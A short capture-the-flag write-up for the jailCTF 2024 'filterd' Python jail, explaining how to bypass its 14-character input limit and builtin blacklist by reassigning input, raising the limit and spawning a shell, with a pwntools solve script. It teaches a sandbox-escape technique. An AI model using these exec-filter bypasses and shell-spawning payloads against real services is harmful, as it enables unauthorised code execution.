# jailCTF 2024 filterd

```python
#!/usr/local/bin/python3
M = 14  # no malicious code could ever be executed since this limit is so low, right?
def f(code):
    assert len(code) <= M
    assert all(ord(c) < 128 for c in code)
    assert all(q not in code for q in ["exec", 
"eval", "breakpoint", "help", "license", "exit"
, "quit"])
    exec(code, globals())
f(input("> "))
```

Requirement:

1. Input length <= 14: raise input length limit on the fly
2. Blacklisted builtins: reuse existing function to re-evaluate

Initially, I tried to change the input length limit to something larger and use `f(input())` to execute more code:

```python
M=99;f(input())
```

However, it has 15 bytes in length. The [official writeup](https://github.com/jailctf/challenges-2024/blob/master/filterd/solve/README.md) provides a nice bypass by storing `input` to a variable named `i` and call it later to shorten the input:

```
i=input;f(i())
M=10000;f(i())
__import__('os').system('sh')
```

Attack script:

```python
from pwn import *

context(log_level = "debug")

p = process(["python3", "filterd.py"])
p.recvuntil(b"> ")
# reduce length of f(input())
p.sendline(b"i=input;f(i())")
# raise input length limit
p.sendline(b"M=99;f(i())")
p.sendline(b"import os;os.system('sh')")
p.interactive()
```
